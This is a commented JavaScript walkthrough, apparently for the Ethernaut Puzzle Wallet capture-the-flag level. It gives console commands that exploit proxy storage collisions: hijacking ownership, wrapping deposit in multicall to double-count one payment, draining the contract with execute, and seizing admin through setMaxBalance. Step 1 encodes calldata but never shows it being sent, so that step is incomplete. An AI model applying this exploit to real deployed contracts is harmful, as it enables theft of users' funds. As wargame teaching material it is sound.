/*
    Well, it was a tough one (even to understand!)

    Actually I would advice you to look for the D-Squared [video](https://www.youtube.com/watch?v=toVc-iX-XAA&t=1052s) for this level but still I gonna try my best to explain this level

    Let's gear up, but wait..Make sure you understand the concepts of -> delegateCalls, proxy contracts (especially how they work), storage collisions while using proxy

    Let's fucking Go!!
*/ 

// So the main idea is to get the admin under our control, like you can see there's a real big fault in the proxy and logic contracts i.e Storage collision, and this is the vulnerability we gonna trick with

// How we gonna do this -> we need to follow some steps:
/*
    1. Make yourself owner of the PuzzleWallet
    2. get whitelisted
    3. Make PuzzleWallet balance = 0
        a. Using 'multicall', get the contract balance (which is 0.001 Eth) equals to your balance (i.e balances[player] == contract.balance)
        b. Execute and get contract balance = 0
    4. set value of 'maxBalance' as your wallet address, This will get us the admin (Look for the storage structure of both proxy and logic contracts) 
*/

// Step 1: Make yourself owner of the PuzzleWallet

// For this, we need to set the value of 'pendingAdmin' in PuzzleProxy contract as our own address, and that can be done by calling the 'proposeNewAdmin' function, But wait a sec, We can't really interact with the PuzzleProxy cuz the instance given to us is of PuzzleWallet right?
// Well, there's a catch..I don't know exactly why is that but if we create a basic abi structure for that 'proposeNewAdmin', then we can make it work (Don't really know the idea behind this, Make a PR if you got this one!)

// Creating the ABI structure for our function (Paste this code in console)
functionSignature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}

// Run these lines next
params = [player]
data = web3.eth.abi.encodeFunctionCall(functionSignature, params)

// You might see this kind of value in the console -> '0xa63767460000000000000000000000009afe8fcbc8465b73319520afedba0c0179f26d97'
// Notice that the last set of bytes is your address, and first 4 bytes (i.e a6376746) is the function signature and responsible for calling the function

// Now you must be the owner of the PuzzleWallet, as the context of pendingAdmin was changed, run this code to check
await contract.owner()


// Step 2: Get yourself Whitelisted
// This is an important step, as the modifier 'onlyWhiteListed' is used at many places, tho this step is damn straightforward, just run the function 'addToWhitelist'

await contract.addToWhitelist(player)


// Step 3: Make PuzzleWallet balance = 0

// This is the most trickiest one by far, and quite difficult to understand..Must pat your back if you got this one in the first go! (Well with my explantion, you definately will!)

// So, now our task is to make the balance = 0, but the problem is that the contract already contains '0.001' eth inside and there seems no way to really take it out, cuz if we call the function 'deposit' and deposited 0.001 eth, then with the help of execute, we can make our balances = 0 but the contract.balance will still remain the same
// Thus, we need to find a way in which we can call the 'deposit' twice but only able to actually deposit 0.001 eth twice, This means, then our contract.balance will be equal to -> 0.002 eth and our own balance will be equal to 0.002 eth (Make sure that our balance is quite represented as numbers, and contract balance gonna be represented in 'ether' form). And after we will call 'execute', this will make the contract.balance = 0, cuz there's a line in the 'execute' function -> balances[msg.sender] -= value, and it follows with a call function (for trasnfering that value to us)

// and this all could be possible by using the 'multicall' function, but yea this function is a bit of a tricky kid, It doesn't really allows us to call deposit twice, cuz there's a 'selector' inside which captures the first 4 bytes of a function call (Remember, when I told you that first 4 signature represent the function we are calling to). Thus, there's a check inside which don't allow us to call 'deposit' twice
// Time for some magic shit, Yes we can make this work if we hid that deposit function or we can say wrap it in some other function and then call that thing, Makes sense right

// Enough explanation, let's make our hands dirty now!

// This will give you the functionSignature of 'deposit'
depositData = await contract.methods["deposit()"].request().then(v => v.data) // "0xd0e30db0"

// This will give you the functionSignature of 'multicall' with 'deposit' wrapped inside
multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
/* "0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000" 
*/

// Notice the first 4 bytes, different than the 'deposit' right..and if you look further, functionSignature of 'deposit' is clearly visible too

// Time to call our multicall function with two 'deposit' calls in a hidden way
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})

// You can check the balance of both player and the contract, they will be 0.002 ether

// Now let's take back our funds, and drain the contract balance
await contract.execute(player, toWei('0.002'), 0x0)

// You can check the balance of the contract
await getBalance(instance) // 0, ah this is same as contract.address, don't doubt it Man!


// Step 4: Set the 'maxBalance' to our wallet address
// Due to storage collision, this method will surely work, and there's no need to explain it further

await contract.setMaxBalance(player)

// Now submit and have a beer!!🍺